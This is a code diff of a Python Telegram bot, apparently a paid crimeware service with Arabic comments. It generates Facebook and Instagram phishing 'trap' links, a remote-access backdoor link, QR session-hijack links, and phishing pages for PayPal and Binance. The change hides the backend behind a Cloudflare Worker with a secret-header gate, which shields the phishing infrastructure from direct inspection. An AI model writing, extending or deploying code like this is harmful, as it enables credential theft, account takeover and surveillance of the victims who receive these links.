@@ -7,7 +7,7 @@ import threading
 import requests
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask
+from flask import Flask, request, jsonify
 import redis
 import uuid
 
@@ -108,7 +108,6 @@ try:
         PRICING_PLANS,
         FREE_TRIAL_USES,
         AVAILABLE_TOOLS,
-        # ★ دوال الأدمن
         is_admin,
         is_vip,
         get_all_users,
@@ -166,7 +165,19 @@ except Exception as e:
 # إعدادات عامة
 # ============================================================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+
+# ★ الرابط العام (الذي يراه المستخدمون) = Cloudflare Worker
+PUBLIC_URL = os.getenv("PUBLIC_URL", "https://x-security.h42536974.workers.dev")
+
+# ★ الرابط الداخلي (Railway) — للاتصالات بين الملفات
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
+
+# ★ للتوافق مع الملفات القديمة — كلها تستخدم PUBLIC_URL الآن
+RAILWAY_URL = PUBLIC_URL
+
+print(f"[+] Public URL: {PUBLIC_URL}")
+print(f"[+] Internal URL: {RAILWAY_URL}")
+
 
 # ============================================================
 # Redis
@@ -235,6 +246,48 @@ app = Flask(__name__)
 
 
 # ============================================================
+# ★★★ Origin Gate — حماية من الوصول المباشر ★★★
+# ============================================================
+ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")
+
+# مسارات مستثناة من الحماية
+ORIGIN_GATE_EXEMPT = [
+    '/',           # Health check
+    '/health',
+]
+
+@app.before_request
+def verify_origin():
+    """يتحقق من أن الطلب قادم من Cloudflare Worker"""
+    
+    # المسارات المستثناة
+    if request.path in ORIGIN_GATE_EXEMPT:
+        return None
+    
+    # إذا طلب OPTIONS (CORS preflight) → اسمح
+    if request.method == 'OPTIONS':
+        return None
+    
+    # افحص الترويسة السرية
+    secret = request.headers.get('X-Origin-Secret', '')
+    
+    if secret == ORIGIN_SECRET:
+        return None
+    
+    # رفض الوصول المباشر
+    client_ip = (request.headers.get('CF-Connecting-IP') or 
+                 request.headers.get('X-Forwarded-For') or 
+                 request.remote_addr)
+    print(f"[-] BLOCKED direct access to {request.path} from {client_ip}")
+    
+    return jsonify({
+        "error": "Access denied",
+        "message": "This endpoint requires the official application",
+        "hint": "Please use the official link"
+    }), 403
+
+
+# ============================================================
 # Health check
 # ============================================================
 @app.route('/')
@@ -264,7 +317,6 @@ init_session_hunter_routes(app, bot)
 if LSH_ENABLED:
     set_bot_reference(bot)
 
-# تسجيل معالجات الدفع
 register_payment_handlers(bot)
 
 
@@ -272,7 +324,6 @@ register_payment_handlers(bot)
 # القوائم
 # ============================================================
 def main_menu(user_id=None):
-    """يبني القائمة الرئيسية - يظهر زر الأدمن فقط للأدمن"""
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
@@ -283,7 +334,6 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
     
-    # ★ زر الأدمن يظهر فقط للأدمن
     if user_id and is_admin(user_id):
         markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
     
@@ -321,7 +371,7 @@ def _deny_message(reason, user_id, tool, data=None):
 
 
 # ============================================================
-# Start Command — يعرض زر الأدمن للأدمن
+# Start Command
 # ============================================================
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
@@ -333,7 +383,6 @@ def start_command(message):
         user_name
     )
     
-    # هل هو أدمن؟
     if is_admin(message.from_user.id):
         text = (
             f"👑 **مرحباً أيها الأدمن {user_name}!**\n\n"
@@ -427,7 +476,6 @@ def callback_handler(call):
         )
         return
 
-    # قائمة المستخدمين
     if call.data.startswith("admin_users_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -452,7 +500,6 @@ def callback_handler(call):
         )
         return
 
-    # تفاصيل مستخدم
     if call.data.startswith("admin_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -475,7 +522,6 @@ def callback_handler(call):
         )
         return
 
-    # حظر مستخدم
     if call.data.startswith("admin_ban_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -486,7 +532,6 @@ def callback_handler(call):
             return
         ban_user(uid)
         bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
-        # أعد تحميل
         user = get_user(uid)
         if user:
             try:
@@ -501,7 +546,6 @@ def callback_handler(call):
                 pass
         return
 
-    # فك حظر
     if call.data.startswith("admin_unban_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -526,7 +570,6 @@ def callback_handler(call):
                 pass
         return
 
-    # منح VIP
     if call.data.startswith("admin_grant_vip_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -561,7 +604,6 @@ def callback_handler(call):
                 pass
         return
 
-    # إزالة VIP
     if call.data.startswith("admin_remove_vip_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -588,7 +630,6 @@ def callback_handler(call):
                 pass
         return
 
-    # حذف مستخدم
     if call.data.startswith("admin_delete_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -610,7 +651,6 @@ def callback_handler(call):
             pass
         return
 
-    # إعطاء اشتراك
     if call.data.startswith("admin_give_sub_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -637,7 +677,6 @@ def callback_handler(call):
         )
         return
 
-    # تفعيل اشتراك
     if call.data.startswith("admin_activate_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -670,7 +709,6 @@ def callback_handler(call):
             bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)
         return
 
-    # إحصائيات
     if call.data == "admin_stats":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -686,7 +724,6 @@ def callback_handler(call):
         )
         return
 
-    # آخر المسجلين
     if call.data == "admin_recent":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -712,7 +749,6 @@ def callback_handler(call):
         )
         return
 
-    # بحث
     if call.data == "admin_search":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -724,7 +760,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_search_handler)
         return
 
-    # رسالة جماعية
     if call.data == "admin_broadcast":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -736,7 +771,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_broadcast_handler)
         return
 
-    # إضافة مستخدم لباقة
     if call.data == "admin_add_sub":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -748,7 +782,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_add_sub_handler)
         return
 
-    # حظر
     if call.data == "admin_ban":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -760,7 +793,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_ban_handler)
         return
 
-    # فك حظر
     if call.data == "admin_unban":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -772,7 +804,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_unban_handler)
         return
 
-    # حذف
     if call.data == "admin_delete":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -784,7 +815,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_delete_handler)
         return
 
-    # منح VIP
     if call.data == "admin_grant_vip":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -796,7 +826,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_grant_vip_handler)
         return
 
-    # إعطاء نجوم
     if call.data == "admin_give_stars":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -809,7 +838,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, admin_give_stars_handler)
         return
 
-    # رسالة لمستخدم
     if call.data.startswith("admin_msg_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
@@ -823,7 +851,6 @@ def callback_handler(call):
         bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
         return
 
-    # noop
     if call.data == "noop":
         bot.answer_callback_query(call.id)
         return
@@ -839,7 +866,7 @@ def callback_handler(call):
             return
         consume_usage(chat_id, "fb")
         bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
-        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
+        link = f"{PUBLIC_URL}/login.php?id={chat_id}"
         bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
         return
 
@@ -854,7 +881,7 @@ def callback_handler(call):
             return
         consume_usage(chat_id, "ig")
         bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
-        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
+        link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
         bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
         return
 
@@ -869,7 +896,7 @@ def callback_handler(call):
             return
         consume_usage(chat_id, "rat")
         bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي...")
-        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
+        link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
         bot.send_message(
             chat_id,
             f"📱 رابط المراقبة والتحكم الخلفي المطور جاهز:\n `{link}` \n\n"
@@ -896,7 +923,7 @@ def callback_handler(call):
             except Exception as e:
                 print(f"Redis write error: {e}")
 
-        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
+        target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
         qr_image = generate_qr_code_bytes(target_link)
         if qr_image:
             qr_image.name = 'pairing_qr.jpg'
@@ -933,14 +960,14 @@ def callback_handler(call):
 
         try:
             requests.post(
-                f"{RAILWAY_URL}/lsh_create",
+                f"{PUBLIC_URL}/lsh_create",
                 json={"chat_id": chat_id, "session_id": session_id},
                 timeout=5
             )
         except Exception as e:
             print(f"[-] LSH create HTTP warning: {e}")
 
-        target_link = f"{RAILWAY_URL}/lsh?s={session_id}&id={chat_id}"
+        target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
         qr_image = lsh_generate_qr(target_link)
 
         if qr_image:
@@ -1023,7 +1050,7 @@ def callback_handler(call):
         session_id = str(uuid.uuid4()).replace('-', '')[:24]
 
         try:
-            requests.post(f"{RAILWAY_URL}/sh_create",
+            requests.post(f"{PUBLIC_URL}/sh_create",
                 json={"chat_id": target_chat, "session_id": session_id, "site": site},
                 timeout=10)
         except Exception as e:
@@ -1045,7 +1072,7 @@ def callback_handler(call):
             "paypal": "باي بال", "binance": "بينانس",
         }
 
-        target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={target_chat}&site={site}"
+        target_link = f"{PUBLIC_URL}/sh?s={session_id}&id={target_chat}&site={site}"
 
         bot.answer_callback_query(call.id, f"✅ {site_names.get(site, site)}")
         bot.send_message(
@@ -1212,7 +1239,7 @@ def callback_handler(call):
 
 
 # ============================================================
-# ★★★ معالجات الأدمن (Next Step) ★★★
+# معالجات الأدمن
 # ============================================================
 def admin_search_handler(message):
     if not is_admin(message.chat.id):
@@ -1396,7 +1423,7 @@ def admin_msg_user_handler(message, uid):
 
 
 # ============================================================
-# معالجة الرابط المُدخل لفتحه على الضحية
+# معالجة الرابط المُدخل
 # ============================================================
 _pending_open_url = {}
 
